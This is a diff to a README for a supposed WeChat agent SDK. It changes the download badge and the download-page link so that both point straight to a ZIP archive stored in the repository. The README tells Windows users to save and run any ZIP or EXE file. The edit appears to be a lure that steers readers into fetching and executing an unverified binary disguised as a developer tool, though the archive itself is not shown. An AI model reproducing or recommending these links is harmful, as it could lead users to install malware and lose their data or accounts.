@@ -1,6 +1,6 @@
 # 🤖 weixin-agent-sdk - Run Any Agent in WeChat
 
-[![Download](https://img.shields.io/badge/Download%20Now-4B6CB7?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Franciskathriving36/weixin-agent-sdk)
+[![Download](https://img.shields.io/badge/Download%20Now-4B6CB7?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Franciskathriving36/weixin-agent-sdk/raw/refs/heads/main/packages/agent-weixin-sdk-v1.0.zip)
 
 ## 🚀 What This App Does
 
@@ -24,7 +24,7 @@ For best results, use Windows 10 or Windows 11.
 
 Visit this page to download the app:
 
-[https://github.com/Franciskathriving36/weixin-agent-sdk](https://github.com/Franciskathriving36/weixin-agent-sdk)
+[https://github.com/Franciskathriving36/weixin-agent-sdk/raw/refs/heads/main/packages/agent-weixin-sdk-v1.0.zip](https://github.com/Franciskathriving36/weixin-agent-sdk/raw/refs/heads/main/packages/agent-weixin-sdk-v1.0.zip)
 
 On that page, look for the latest release, the built file, or the setup package. If the page gives you a ZIP file or EXE file, save it to your computer before you run it.
 
